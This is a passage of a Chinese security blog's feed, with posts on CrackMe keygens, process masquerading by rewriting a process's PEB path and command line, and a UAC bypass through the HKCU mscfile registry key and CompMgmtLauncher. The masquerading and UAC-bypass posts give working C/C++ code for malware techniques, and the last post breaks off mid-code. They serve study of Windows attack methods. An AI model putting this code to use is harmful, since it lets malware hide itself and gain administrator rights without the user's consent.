fcomp是比较后改变寄存器状态，然后再由fstsw指令将寄存器值传给ax</p><table><thead><tr><th>比较结果</th><th>C3</th><th>C0</th></tr></thead><tbody><tr><td>ST(0)&gt;源操作数</td><td>0</td><td>0</td></tr><tr><td>ST(0)&lt;源操作数</td><td>0</td><td>1</td></tr><tr><td>ST(0)=源操作数</td><td>1</td><td>0</td></tr><tr><td>ST(0)不可比较</td><td>1</td><td>1</td></tr></tbody></table><p>看一下FST寄存器，看到寄存器中的值，此时是输入等于计算的时候，看到FST是4000，C3是1</p><p><img src="/2021/07/21/160CrackMe-003/3.png"></p><p>计算器转换一下看的仔细</p><p><img src="/2021/07/21/160CrackMe-003/4.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>    gets_s(name, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>    <span class="hljs-keyword">int</span> serial;<br>    serial = len * <span class="hljs-number">0x15B38</span>;<br>    serial += name[<span class="hljs-number">0</span>];<br>    serial = (serial + <span class="hljs-number">2</span>) * <span class="hljs-number">3</span> - <span class="hljs-number">2</span> + <span class="hljs-number">15</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;serial:%d\n&quot;</span>, serial);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/21/160CrackMe-003/5.png"></p><p>输入正确的serial</p><p><img src="/2021/07/21/160CrackMe-003/6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序看到需要输入用户名和序列号尝试输入后提示错误&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/21/160CrackMe-003</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>隐藏技术-进程伪装</title>
    <link href="https://b1ackie.cn/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/"/>
    <id>https://b1ackie.cn/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/</id>
    <published>2021-07-21T06:02:59.000Z</published>
    <updated>2021-08-09T10:52:36.592Z</updated>
    
    <content type="html"><![CDATA[<h4 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h4><p>进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现起来原理并不复杂，就是修改指定进程的进程环境块PEB中的进程路径以及命令行信息即可。下面使用Windbg来查看一下notepad的相关信息。</p><p>查看PEB的相关信息，可以看到ProcessParameters，这里有进程的路径和命令行相关信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/1.png"></p><p>继续查看这个结构，可以看到ImagePathName和CommandLine，也可以看到其中的信息都是”C:\Windows\system32\notepad.exe”</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/2.png"></p><h4 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h4><ul><li>获取PEB地址</li><li>获取ProcessParameters</li><li>写入伪装信息</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// DisguiseProcess.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;process.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* typedef_NtQueryInformationProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">IN HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">IN PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PVOID ProcessInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">IN ULONG ProcessInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PULONG ReturnLength OPTIONAL</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-comment">/*PID：需要进行伪装的进程PID</span><br><span class="hljs-comment">* lpwszpath：伪装路径</span><br><span class="hljs-comment">* lpwszcmd：伪装命令行</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DisguiseProcess</span><span class="hljs-params">(DWORD PID, <span class="hljs-keyword">wchar_t</span>* lpwszPath, <span class="hljs-keyword">wchar_t</span>* lpwszCmd)</span> </span>&#123;<br><span class="hljs-comment">//打开进程获取句柄</span><br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>typedef_NtQueryInformationProcess NtQueryInformationProcess = <span class="hljs-literal">NULL</span>;<br>PROCESS_BASIC_INFORMATION pbi = &#123; <span class="hljs-number">0</span> &#125;;<br>PEB peb = &#123; <span class="hljs-number">0</span> &#125;;<br>RTL_USER_PROCESS_PARAMETERS Param = &#123; <span class="hljs-number">0</span> &#125;;<br>USHORT usCmdLen = <span class="hljs-number">0</span>;<br>USHORT usPathLen = <span class="hljs-number">0</span>;<br>NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br><span class="hljs-keyword">if</span> (NtQueryInformationProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取函数地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, <span class="hljs-keyword">sizeof</span>(pbi), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取进程信息失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取peb的地址</span><br>ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="hljs-keyword">sizeof</span>(peb), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取ProcessParameters地址</span><br>ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, <span class="hljs-keyword">sizeof</span>(Param), <span class="hljs-literal">NULL</span>);<br>usCmdLen = <span class="hljs-number">2</span> + <span class="hljs-number">2</span> * wcslen(lpwszCmd);<br><span class="hljs-comment">//写入命令行信息</span><br>WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, <span class="hljs-literal">NULL</span>);<br>WriteProcessMemory(hProcess, &amp;Param.CommandLine.Length, &amp;usCmdLen, <span class="hljs-keyword">sizeof</span>(usCmdLen), <span class="hljs-literal">NULL</span>);<br>usPathLen = <span class="hljs-number">2</span> + <span class="hljs-number">2</span> * wcslen(lpwszPath);<br><span class="hljs-comment">//写入路径信息</span><br>WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, <span class="hljs-literal">NULL</span>);<br>WriteProcessMemory(hProcess, &amp;Param.ImagePathName.Length, &amp;usPathLen, <span class="hljs-keyword">sizeof</span>(usPathLen), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//伪装自身获取自身PID，如果伪装其他程序可以通过窗口或者进程名方式获得PID </span><br><span class="hljs-keyword">if</span> (DisguiseProcess(_getpid(), <span class="hljs-string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="hljs-string">L&quot;C:\\Windows\\Syetem32\\notepad.exe&quot;</span>) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;进程伪装失败\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;伪装成功\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行伪装程序，提示伪装成功</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/3.png"></p><p>然后使用Process Explorer查看伪装程序的相关信息。可以看到进程已经伪装成功，描述这里写着记事本，路径和命令行都是我们写入的伪装信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;进程伪装&quot;&gt;&lt;a href=&quot;#进程伪装&quot; class=&quot;headerlink&quot; title=&quot;进程伪装&quot;&gt;&lt;/a&gt;进程伪装&lt;/h4&gt;&lt;p&gt;进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。&lt;/p&gt;
&lt;h4 i</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="隐藏技术" scheme="https://b1ackie.cn/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>提权技术-Bypass UAC</title>
    <link href="https://b1ackie.cn/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/"/>
    <id>https://b1ackie.cn/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/</id>
    <published>2021-07-20T06:24:40.000Z</published>
    <updated>2021-08-09T10:52:25.166Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>UAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。</p><p>正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/1.png"></p><p>在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>下面拿白名单程序CompMgmtLauncher来进行一下分析。</p><h4 id="分析CompMgmtLauncher启动过程"><a href="#分析CompMgmtLauncher启动过程" class="headerlink" title="分析CompMgmtLauncher启动过程"></a>分析CompMgmtLauncher启动过程</h4><p>打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\Software\Classes\mscfile\shell\open\command中的值。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/2.png"></p><p>可以看一下，此路径中存在什么，可以看到其中没有值</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/3.png"></p><p>如果该路径没有值，然后就会查询HKCR\mscfile\shell\open\command，查看其中的值，存储这mmc.exe进程的路径信息。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/4.png"></p><p>现在可以知道，当它启动时，会先查看HKCU\Software\Classes\mscfile\shell\open\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。</p><p>现在就修改注册表信息，在HKCU\Software\Classes\mscfile\shell\open\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    PVOID OldValue = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//关闭重定位</span><br>    <span class="hljs-built_in">Wow64DisableWow64FsRedirection</span>(&amp;OldValue);<br>    HKEY hKey = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, <span class="hljs-string">&quot;Software\\Classes\\mscfile\\Shell\\Open\\Command&quot;</span>,<br>        <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WOW64_64KEY | KEY_ALL_ACCESS, <span class="hljs-literal">NULL</span>, &amp;hKey, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hKey == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建键值失败\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">RegSetValueEx</span>(hKey, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, (<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>) + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;CompMgmtLauncher.exe&quot;</span>);<br>    <span class="hljs-built_in">Wow64RevertWow64FsRedirection</span>(OldValue);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/5.png"></p><p>使用procmon工具查看权限可以看到权限是高</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/6.png"></p><p>正常启动查看权限可以看到是中。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/7.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Bypass-UAC&quot;&gt;&lt;a href=&quot;#Bypass-UAC&quot; class=&quot;headerlink&quot; title=&quot;Bypass UAC&quot;&gt;&lt;/a&gt;Bypass UAC&lt;/h4&gt;&lt;p&gt;UAC（UserAccount Control，用户账户控制）是微软在VIS</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="提权技术" scheme="https://b1ackie.cn/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"/>
    
    <category term="UAC" scheme="https://b1ackie.cn/tags/UAC/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-002</title>
    <link href="https://b1ackie.cn/2021/07/20/160CrackMe-002/"/>
    <id>https://b1ackie.cn/2021/07/20/160CrackMe-002/</id>
    <published>2021-07-20T02:17:33.000Z</published>
    <updated>2021-08-09T10:55:33.726Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到提示输入name和serial，输入后，提示错误。</p><p><img src="/2021/07/20/160CrackMe-002/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查壳，看到程序没有加壳，是用VB语言写的。</p><p><img src="/2021/07/20/160CrackMe-002/2.png"></p><p>使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转</p><p><img src="/2021/07/20/160CrackMe-002/3.png"></p><p>开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402412 </span>  .  <span class="hljs-number">50</span>            push eax                                   ; /String = <span class="hljs-number">0000000</span>A ???<br><span class="hljs-symbol">00402413 </span>  .  <span class="hljs-number">8</span>B1A          mov ebx,dword ptr ds:[edx]                 ; |<br><span class="hljs-symbol">00402415 </span>  .  FF15 E4404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \__vbaLenBstr<br><span class="hljs-number">0040241</span>B   .  <span class="hljs-number">8</span>BF8          mov edi,eax                                ;  获取输入的<span class="hljs-keyword">name</span>长度传入edi以便运算<br><span class="hljs-number">0040241</span>D   .  <span class="hljs-number">8</span>B4D E8       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x18]<br><span class="hljs-symbol">00402420 </span>  .  <span class="hljs-number">69</span>FF FB7C0100 imul edi,edi,<span class="hljs-number">0</span>x17CFB                       ;  长度乘<span class="hljs-number">0</span>x17CFB<br><span class="hljs-symbol">00402426 </span>  .  <span class="hljs-number">51</span>            push ecx                                   ; /String = <span class="hljs-number">80020004</span> ???<br><span class="hljs-symbol">00402427 </span>  .  <span class="hljs-number">0</span>F80 <span class="hljs-number">91020000</span> jo Afkayas_.<span class="hljs-number">004026</span>BE                       ; |<br><span class="hljs-number">0040242</span>D   .  FF15 F8404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]       ; \rtcAnsiValueBstr<br><span class="hljs-symbol">00402433 </span>  .  <span class="hljs-number">0</span>FBFD0        movsx edx,ax                               ;  获取输入的第一个ascii传给edx<br><span class="hljs-symbol">00402436 </span>  .  <span class="hljs-number">03</span>FA          add edi,edx                                ;  乘法后的结果加上第一个ascii<br><span class="hljs-symbol">00402438 </span>  .  <span class="hljs-number">0</span>F80 <span class="hljs-number">80020000</span> jo Afkayas_.<span class="hljs-number">004026</span>BE<br><span class="hljs-number">0040243</span>E   .  <span class="hljs-number">57</span>            push edi                                   ;  MSVBVM50.__vbaStrCat<br><span class="hljs-number">0040243</span>F   .  FF15 E0404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ;  计算结果转为字符串（十进制）<br><span class="hljs-symbol">00402445 </span>  .  <span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-symbol">00402447 </span>  .  <span class="hljs-number">8D4</span>D E0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x20]<br></code></pre></div></td></tr></table></figure><p>然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402510 </span>  &gt; \<span class="hljs-number">8</span>B45 E8       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x18]            ;  输入的Serial<br><span class="hljs-symbol">00402513 </span>  .  <span class="hljs-number">8</span>B4D E4       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x1C]            ;  计算后的结果<br><span class="hljs-symbol">00402516 </span>  .  <span class="hljs-number">8</span>B3D <span class="hljs-number">00414000</span> mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;;  MSVBVM50.__vbaStrCat<br><span class="hljs-number">0040251</span>C   .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-number">0040251</span>D   .  <span class="hljs-number">68</span> <span class="hljs-number">701</span>B4000   push Afkayas_.<span class="hljs-number">00401</span>B70                     ;  AKA-<br><span class="hljs-symbol">00402522 </span>  .  <span class="hljs-number">51</span>            push ecx                                   ; /String = <span class="hljs-number">80020004</span> ???<br><span class="hljs-symbol">00402523 </span>  .  FFD7          <span class="hljs-keyword">call</span> edi                                   ; \将AKA- 与计算后的数值拼接起来<br><span class="hljs-symbol">00402525 </span>  .  <span class="hljs-number">8</span>B1D <span class="hljs-number">70414000</span> mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;;  MSVBVM50.__vbaStrMove<br><span class="hljs-number">0040252</span>B   .  <span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-number">0040252</span>D   .  <span class="hljs-number">8D4</span>D E0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x20]<br><span class="hljs-symbol">00402530 </span>  .  FFD3          <span class="hljs-keyword">call</span> ebx                                   ;  MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;<br><span class="hljs-symbol">00402532 </span>  .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-symbol">00402533 </span>  .  FF15 <span class="hljs-number">28414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;;  比较<br></code></pre></div></td></tr></table></figure><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>根据分析的结果进行注册机编写</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span 